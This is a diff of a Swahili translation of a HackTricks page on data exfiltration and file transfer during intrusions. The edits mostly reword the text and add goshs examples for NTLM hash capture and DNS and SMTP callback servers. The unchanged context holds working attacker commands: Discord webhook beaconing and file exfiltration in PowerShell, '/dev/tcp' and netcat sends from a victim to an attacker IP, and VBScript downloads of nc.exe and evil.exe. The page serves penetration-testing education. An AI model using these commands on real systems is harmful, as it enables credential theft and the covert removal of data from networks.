@@ -3,17 +3,17 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Kwa mfano kuanzia mwanzo hadi mwisho wa staging loot katika `C:\Users\Public` na exfiltrating kwa Rclone ili kuiga legitimate backups, angalia mtiririko wa kazi hapa chini.
+> Kwa mfano wa mwisho-hadi-mwisho wa kuweka loot katika `C:\Users\Public` na kuifanya exfiltration kwa kutumia Rclone ili kuiga backups halali, angalia workflow hapa chini.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Domains zinazowekwa whitelisted kwa kawaida ili exfiltrate taarifa
+## Majina ya domains yanayoruhusiwa mara nyingi kwa ajili ya exfiltrate taarifa
 
-Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domains zinazowekwa whitelisted kwa kawaida ambazo zinaweza kutumiwa vibaya
+Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata majina ya domains yanayoruhusiwa mara nyingi ambayo yanaweza kutumiwa vibaya
 
-## Nakili\&Bandika Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Kupakia mafaili
+### Pakia files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **Seva ya HTTPS**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,14 +107,47 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) ni mbadala wa `python3 -m http.server` wa faili moja-binary
+wenye upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+na vipengele vya OOB collaboration (DNS, SMTP, NTLM hash capture).
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) kwa C2 & Data Exfiltration
 
-Webhooks ni endpoints za HTTPS za kuandika tu ambazo zinakubali JSON na sehemu za faili za hiari. Mara nyingi zinaruhusiwa kwenye domain za SaaS zinazotumika kuaminika na hazihitaji OAuth/API keys, hivyo zinafaa kwa beaconing na exfiltration kwa njia rahisi.
+Webhooks ni HTTPS endpoints za kuandika-tu zinazokubali JSON na parts za hiari za faili. Mara nyingi huruhusiwa kwa trusted SaaS domains na hazihitaji OAuth/API keys, hivyo ni muhimu kwa beaconing na exfiltration isiyo na msuguano mwingi.
 
-Mambo muhimu:
-- Endpoint: Discord inatumia https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data na sehemu iitwayo payload_json yenye {"content":"..."} pamoja na sehemu za faili za hiari zikiitwa file.
-- Mfumo wa mzunguko wa operator: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK zinathibitisha utolewaji.
+Mawazo muhimu:
+- Endpoint: Discord hutumia https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data ukiwa na part iitwayo payload_json ikibeba {"content":"..."} na sehemu za hiari za faili zinazoitwa file.
+- Muundo wa operator loop: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK huthibitisha delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -184,8 +217,8 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Vidokezo:
-- Mifano sawa inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) yanayotumia incoming webhooks; rekebisha URL na JSON schema ipasavyo.
+Maelezo:
+- Mifumo inayofanana inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) yanayotumia incoming webhooks zao; rekebisha URL na JSON schema ipasavyo.
 - Kwa DFIR ya Discord Desktop cache artifacts na webhook/API recovery, angalia:
 
 {{#ref}}
@@ -199,7 +232,7 @@ Vidokezo:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### Seva ya FTP (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -222,7 +255,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** mteja
+### **Windows** client
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -242,7 +275,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Au unda smb share **kutumia samba**:
+Au tengeneze smb share **kwa kutumia samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,6 +298,16 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) ni mbadala wa binary moja
+unaohudumia faili kupitia SMB na kunasa hashes za NetNTLMv2 kutoka kwa wateja wanaounganisha:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
 Mshambuliaji lazima awe na SSHd ikifanya kazi.
@@ -273,7 +316,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ikiwa victim ana SSH, attacker anaweza ku-mount directory kutoka kwa victim hadi attacker.
+Ikiwa victim ana SSH, attacker anaweza ku-mount directory kutoka kwa victim kwenda kwa attacker.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,19 +329,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Pakua faili kutoka kwa mwathiriwa
+### Pakua faili kutoka kwa victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Pakia faili kwa mwathirika
+### Pakia faili kwa victim
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Shukrani kwa **@BinaryShadow\_**
+shukrani kwa **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -320,27 +363,41 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ili kupokea data kwa kutumia python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ya kupokea data hiyo kwa python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) inaweza kuanzisha kwa haraka SMTP server
+ili kunasa email callbacks wakati wa OOB exfiltration scenarios:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Barua pepe na callbacks zilizopokelewa zinaonyeshwa moja kwa moja kwenye matokeo ya terminal.
+Inaweza kuunganishwa na DNS callback server kwa coverage kamili ya OOB:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-Kawaida kwenye XP na 2003 (kwa zingine inapaswa kuongezwa wazi wakati wa usakinishaji)
+Kwa chaguo-msingi katika XP na 2003 (katika nyingine zinahitaji kuongezwa waziwazi wakati wa usakinishaji)
 
-Kwenye Kali, **anzisha seva ya TFTP**:
+Katika Kali, **anzisha TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server kwa python:**
+**Seva ya TFTP katika python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Katika **victim**, ungana na seva ya Kali:
+Katika **victim**, ungana na server ya Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -354,7 +411,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Mwenyeathirika**
+**Mhasiriwa**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -388,19 +445,20 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga tena kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Walakini, ni muhimu kutambua kwamba debug.exe ina **kizuizi katika assembling faili hadi ukubwa wa 64 kb**.
+Programu ya `debug.exe` haikuruhusu tu kukagua binaries bali pia ina **uwezo wa kuzijenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kutengeneza faili ya binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha kuassemble faili zenye ukubwa hadi 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha nakili na ubandike maandishi hayo kwenye windows-shell, faili inayoitwa nc.exe itaumbwa.
+Kisha nakili-bandika maandishi kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
 ## Marejeo
 
